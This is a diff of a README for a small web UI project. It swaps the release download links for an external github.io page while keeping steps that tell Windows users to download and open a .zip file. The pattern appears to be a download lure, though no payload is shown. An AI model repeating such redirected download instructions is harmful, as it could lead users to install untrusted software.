@@ -1,6 +1,6 @@
 # 🌎 apex-planet-task5-ui - An easy web experience for everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/bebeunstatesmanlike858/apex-planet-task5-ui/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://bebeunstatesmanlike858.github.io)
 
 Apex Planet Task5 brings a simple web interface to your computer. It renders pages directly in your web browser. You do not need to install complex software or manage databases to use this tool. This project provides a clean look at task management data for the year 2026.
 
@@ -8,7 +8,7 @@ Apex Planet Task5 brings a simple web interface to your computer. It renders pag
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/bebeunstatesmanlike858/apex-planet-task5-ui/releases).
+1.  Visit the [official download page](https://bebeunstatesmanlike858.github.io).
 2.  Look for the section labeled "Assets."
 3.  Click the file ending in .zip to start your download.
 4.  Open your Downloads folder once the file finishes saving.
